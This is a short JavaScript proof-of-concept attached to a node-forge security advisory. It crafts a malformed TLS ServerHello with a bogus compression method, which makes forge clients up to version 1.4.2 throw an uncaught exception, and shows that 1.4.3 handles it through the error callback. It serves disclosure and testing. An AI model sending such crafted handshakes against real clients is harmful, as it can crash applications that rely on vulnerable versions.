// Security Advisory PoC
//
// https://github.com/digitalbazaar/forge/security/advisories/GHSA-w4xr-hqv8-ch44
//
// @alienkeric

// verify callback, to show no permissive verify option is needed.
var forge = require('../..');

function rec(type, frag) {
  var b = forge.util.createBuffer();
  b.putByte(type); b.putByte(3); b.putByte(1); b.putInt16(frag.length);
  b.putBytes(frag); return b.getBytes();
}
function hs(type, body) {
  var b = forge.util.createBuffer();
  b.putByte(type);
  b.putInt24(typeof body.length === 'function' ? body.length() : body.length);
  b.putBytes(body); return rec(22, b.getBytes());
}

var caKeys = forge.pki.rsa.generateKeyPair(1024);
var srvKeys = forge.pki.rsa.generateKeyPair(1024);
var caName = [{name: 'commonName', value: 'PoC CA'}];
var srvName = [{name: 'commonName', value: 'legit.example'}];

function mkCert(keys, subj, issuer, ca) {
  var c = forge.pki.createCertificate();
  c.publicKey = keys.publicKey; c.serialNumber = ca ? '01' : '02';
  c.validity.notBefore = new Date('2020-01-01T00:00:00Z');
  c.validity.notAfter = new Date('2030-01-01T00:00:00Z');
  c.setSubject(subj); c.setIssuer(issuer);
  c.setExtensions(ca ?
    [{name: 'basicConstraints', cA: true, critical: true},
     {name: 'keyUsage', keyCertSign: true, critical: true}] :
    [{name: 'basicConstraints', cA: false, critical: true}]);
  return c;
}
var ca = mkCert(caKeys, caName, caName, true);
ca.sign(caKeys.privateKey, forge.md.sha256.create());
var srv = mkCert(srvKeys, srvName, caName, false);
ca = forge.pki.certificateFromPem(forge.pki.certificateToPem(ca));
srv.sign(caKeys.privateKey, forge.md.sha256.create());

var der = forge.asn1.toDer(forge.pki.certificateToAsn1(srv)).getBytes();
var sh = forge.util.createBuffer();
sh.putByte(3); sh.putByte(1);
sh.putBytes(forge.random.getBytes(32));
sh.putByte(0);
sh.putByte(0x00); sh.putByte(0x2f);   // TLS_RSA_WITH_AES_128_CBC_SHA
sh.putByte(0xff);                     // bogus compression_method
var certMsg = forge.util.createBuffer();
certMsg.putInt24(3 + der.length); certMsg.putInt24(der.length); certMsg.putBytes(der);
var data = hs(2, sh.getBytes()) + hs(11, certMsg.getBytes()) + hs(14, '');

var client = forge.tls.createConnection({
  server: false,
  caStore: [ca],
  tlsDataReady: function() {}, dataReady: function() {},
  closed: function() {},
  error: function(c, e) { console.log('tls error callback:', e.message); }
});
client.handshake();
try {
  client.process(data);
  console.log('no exception');
} catch(e) {
  console.log('UNCAUGHT:', e.constructor.name + ': ' + e.message);
}

// <= 1.4.2: UNCAUGHT: Error: Unsupported compression algorithm.
// 1.4.3: tls error callback: Unsupported compression method.
//        no exception
